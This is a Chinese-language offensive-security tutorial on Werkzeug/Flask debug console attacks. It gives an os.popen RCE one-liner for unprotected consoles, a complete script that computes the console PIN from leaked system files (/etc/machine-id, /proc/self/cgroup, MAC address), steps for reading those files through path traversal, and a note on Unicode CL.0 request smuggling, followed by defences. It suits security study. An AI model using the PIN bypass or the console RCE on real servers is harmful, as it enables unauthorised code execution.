---
attack_surface:
  - 配置缺陷
  - 信息泄露
  - 协议解析差异
impact:
  - 远程代码执行
  - 信息泄露
  - 身份伪造
risk_level: 高
prerequisites:
  - Flask / Werkzeug 框架基础
  - Python 调试模式概念
  - Linux 文件系统基础（/proc、/sys、/etc）
related_techniques:
  - http-request-smuggling
  - path-traversal
  - credential-harvesting
difficulty: 中级
tools:
  - wconsole_extractor
  - curl
  - python3
---

# Werkzeug Debug Exposure — Werkzeug / Flask Debug Console Attacks — Werkzeug 调试端点攻击

> 关联文档：[uWSGI & WSGI](../uWSGI%20&%20WSGI/README.md) · [HTTP Request Smuggling](../../Proxies/HTTP%20Request%20Smuggling/README.md) · [Path Traversal](../../User%20input/Reflected%20Values/File%20Inclusion-Path%20Traversal/README.md) · [SSRF](../../User%20input/Reflected%20Values/SSRF/README.md)

---

### 知识路径

```
Werkzeug Debug Exposure（本文档）
  ├── 前置知识：Flask / Werkzeug 框架 — WSGI 应用、调试模式
  ├── 前置知识：Python 进程调试概念
  ├── 进阶：Werkzeug PIN 生成算法逆向 → 绕过 Console 认证
  ├── 关联：HTTP Request Smuggling — Werkzeug Unicode → CL.0 去同步
  │   └── 参见：Proxies/HTTP Request Smuggling
  ├── 关联：Path Traversal — 泄露 PIN 生成所需文件
  │   └── 参见：User input/Reflected Values/File Inclusion-Path Traversal
  └── 关联：uWSGI & WSGI — Werkzeug 是 Python WSGI 工具库
      └── 参见：Web Servers & Middleware/uWSGI & WSGI
```

---

# 0x01 Werkzeug Debug — 原理与攻击面

## 1.1 概述

Werkzeug 是 Flask 框架底层的 WSGI 工具库。其内置的调试器提供交互式调试控制台（`/console`），允许在发生异常时直接在浏览器中执行 Python 代码。

**攻击面：**

| 场景 | 条件 | 影响 |
|------|------|------|
| 无 PIN 保护的 Console | 调试模式启用，无 PIN 设置 | 直接 RCE — 通过浏览器执行任意 Python 代码 |
| PIN 保护的 Console | 调试模式启用，控制台被 PIN 锁定 | 需通过文件遍历泄露系统信息 → 本地计算 PIN → 解锁后 RCE |
| Unicode 头部 CL.0 | Werkzeug 处理含 Unicode 字符的请求头 | HTTP Request Smuggling — 请求体被解释为下一个 HTTP 请求 |

## 1.2 攻击入口识别

- `Flask` 应用在调试模式下运行时，任何未处理异常会触发 Werkzeug 调试器
- 主动触发错误（如访问不存在的路由、传入畸形参数）→ 查看是否出现调试器界面
- 直接访问 `/console` → 检查是否有 Python 交互式 Shell 或 PIN 锁定提示

---

# 0x02 无 PIN 保护的 Console RCE

## 2.1 机制

如果调试模式激活且 Console 未设置 PIN，直接访问 `/console` 可获得交互式 Python Shell：

```python
__import__('os').popen('whoami').read();
```

[图片: Werkzeug/Flask Debug Interactive Console — Qwen 提取。CTF 场景中成功访问的交互式 Console。已执行 `__import__('os').popen('whoami').read()` 和 `ls`，输出显示 `flag.txt`、`main.py`、`requirements.txt` 和 `templates` 目录。下一步通常为 `cat flag.txt` 或 `open('flag.txt').read()` 获取 flag。证明无 PIN 保护的 `/console` 可直接 RCE。]

互联网上还有多个利用工具，如 [Werkzeug-Debug-RCE](https://github.com/its-arun/Werkzeug-Debug-RCE) 和 Metasploit 中的相应模块。

---

# 0x03 PIN 保护绕过 — PIN 生成算法利用

## 3.1 机制

当 `/console` 端点被 PIN 保护时，会看到以下消息：

```
The console is locked and needs to be unlocked by entering the PIN.
You can find the PIN printed out on the standard output of your
shell that runs the server
```

PIN 并非随机生成 — Werkzeug 使用**确定性的 PIN 生成算法**，基于运行环境中的特定系统信息进行哈希计算。如果攻击者能获取生成 PIN 所需的变量，就可以在本地计算相同的 PIN。

## 3.2 所需变量

### 3.2.1 `probably_public_bits`

- **`username`**：启动 Flask 会话的用户名
- **`modname`**：通常为 `flask.app`
- **`getattr(app, '__name__', getattr(app.__class__, '__name__'))`**：通常为 **Flask**
- **`getattr(mod, '__file__', None)`**：Flask 目录中 `app.py` 的完整路径（如 `/usr/local/lib/python3.5/dist-packages/flask/app.py`）。如果 `app.py` 不适用，尝试 **`app.pyc`**

### 3.2.2 `private_bits`

- **`uuid.getnode()`**：当前机器的 MAC 地址，`str(uuid.getnode())` 转换为十进制格式

  - 要**确定服务器的 MAC 地址**，需识别应用使用的活动网络接口（如 `ens3`）。不确定时，**泄露 `/proc/net/arp`** 找到设备 ID，然后从 **`/sys/class/net/<device id>/address`** 提取 MAC 地址
  - 十六进制 MAC 转十进制：

    ```python
    # 示例 MAC 地址：56:00:02:7a:23:ac
    >>> print(0x5600027a23ac)
    94558041547692
    ```

- **`get_machine_id()`**：拼接 `/etc/machine-id` 或 `/proc/sys/kernel/random/boot_id` 的数据和 `/proc/self/cgroup` 中最后一个 `/` 之后的第一行：

```python
def get_machine_id() -> t.Optional[t.Union[str, bytes]]:
    global _machine_id

    if _machine_id is not None:
        return _machine_id

    def _generate() -> t.Optional[t.Union[str, bytes]]:
        linux = b""

        # machine-id 跨启动稳定，boot_id 跨启动变化
        for filename in "/etc/machine-id", "/proc/sys/kernel/random/boot_id":
            try:
                with open(filename, "rb") as f:
                    value = f.readline().strip()
            except OSError:
                continue

            if value:
                linux += value
                break

        # 容器共享相同的 machine-id，加入 cgroup 信息以区分
        # 此方法在容器外同样适用，但跨启动相对稳定
        try:
            with open("/proc/self/cgroup", "rb") as f:
                linux += f.readline().strip().rpartition(b"/")[2]
        except OSError:
            pass

        if linux:
            return linux

        # macOS 上使用 ioreg 获取计算机序列号
        try:
```

## 3.3 PIN 生成脚本

收集所有必要数据后，执行以下脚本生成 Werkzeug Console PIN：

```python
import hashlib
from itertools import chain
probably_public_bits = [
    'web3_user',  # username
    'flask.app',  # modname
    'Flask',  # getattr(app, '__name__', getattr(app.__class__, '__name__'))
    '/usr/local/lib/python3.5/dist-packages/flask/app.py'  # getattr(mod, '__file__', None),
]

private_bits = [
    '279275995014060',  # str(uuid.getnode()),  /sys/class/net/ens33/address
    'd4e6cb65d59544f3331ea0425dc555a1'  # get_machine_id(), /etc/machine-id
]

# h = hashlib.md5()  # Werkzeug 2.0.0 之前的版本使用 MD5
h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')
# h.update(b'shittysalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv = None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)
```

脚本通过哈希拼接的 bits，添加特定 salt（`cookiesalt` 和 `pinsalt`），并格式化输出来生成 PIN。

> [!TIP]
> 如果是**旧版本** Werkzeug，尝试将**哈希算法改为 md5** 而非 sha1。

## 3.4 获取变量值的攻击链

1. 利用**文件遍历漏洞**或**SSRF+文件读取**获取所需文件：
   - `/etc/machine-id`
   - `/proc/sys/kernel/random/boot_id`
   - `/proc/self/cgroup`
   - `/sys/class/net/<device>/address`
   - `/proc/net/arp`
2. 通过错误堆栈回溯或配置文件泄露获取 `app.py` 路径
3. 通过 `/etc/passwd` 或进程列表获取用户名
4. 组装 bits → 本地计算 PIN → 解锁 Console

---

# 0x04 Werkzeug Unicode 字符 → CL.0 Request Smuggling

## 4.1 机制

如 [Werkzeug issue #2833](https://github.com/pallets/werkzeug/issues/2833) 中观察到的，Werkzeug 不会正确关闭包含 **Unicode 字符**的请求头连接。如[此 writeup](https://mizu.re/post/twisty-python) 所述，这可能导致 CL.0 Request Smuggling 漏洞。

这是因为在 Werkzeug 中，发送某些 **Unicode 字符**会导致服务器**断开**。然而，如果 HTTP 连接创建时带有头部 **`Connection: keep-alive`**，请求体不会被读取且连接仍保持打开，因此请求的 **body** 将被视为**下一个 HTTP 请求**。

## 4.2 利用条件

- Werkzeug 直接暴露（无前端代理 — 纯 Werkzeug 开发/调试服务器）
- `Connection: keep-alive` 已启用
- 能够发送包含特定 Unicode 字符的请求头

## 4.3 参考

- [Werkzeug issue #2833](https://github.com/pallets/werkzeug/issues/2833)
- [mizu.re — Twisty Python (CL.0 Request Smuggling via Werkzeug)](https://mizu.re/post/twisty-python)

---

# 0x05 自动化利用

## 5.1 wconsole_extractor

[wconsole_extractor](https://github.com/Ruulian/wconsole_extractor) 是一个自动化 Werkzeug Console PIN 提取/生成工具。

## 5.2 Werkzeug-Debug-RCE

[Werkzeug-Debug-RCE](https://github.com/its-arun/Werkzeug-Debug-RCE) 用于自动化利用无 PIN 保护的 `/console` 端点。

## 5.3 Metasploit

Metasploit 框架包含针对 Werkzeug Debug Console 的利用模块。

---

# 0x06 防御

| 措施 | 理由 |
|------|------|
| 生产环境**绝不能**启用 Flask/Werkzeug 调试模式（`debug=False`） | 消除整个 Console 攻击面 |
| 如必须调试，使用 `debug=True` 但绑定到 `127.0.0.1` | 限制 Console 仅本地访问 |
| 在 Werkzeug 之前部署反向代理（nginx）处理请求头清理 | 防止 Unicode CL.0 走私 |
| 升级 Werkzeug 至最新版本 | PIN 算法变更和安全修复 |
| 确保服务器文件不可通过 Web 路径遍历读取 | 阻止 PIN 计算所需文件的泄露 |

## 参考资料

- [Werkzeug Console PIN Exploit — daehee.com](https://www.daehee.com/werkzeug-console-pin-exploit/)
- [CTFtime Writeup — PIN Exploitation](https://ctftime.org/writeup/17955)
- [Werkzeug issue #2833 — Unicode CL.0](https://github.com/pallets/werkzeug/issues/2833)
- [mizu.re — Twisty Python (CL.0 Smuggling)](https://mizu.re/post/twisty-python)
- [Werkzeug Source — Debug __init__.py (PIN 算法)](https://github.com/pallets/werkzeug/blob/master/src/werkzeug/debug/__init__.py)
- [wconsole_extractor — 自动化 PIN 提取](https://github.com/Ruulian/wconsole_extractor)
- [Werkzeug-Debug-RCE — Console RCE 利用](https://github.com/its-arun/Werkzeug-Debug-RCE)
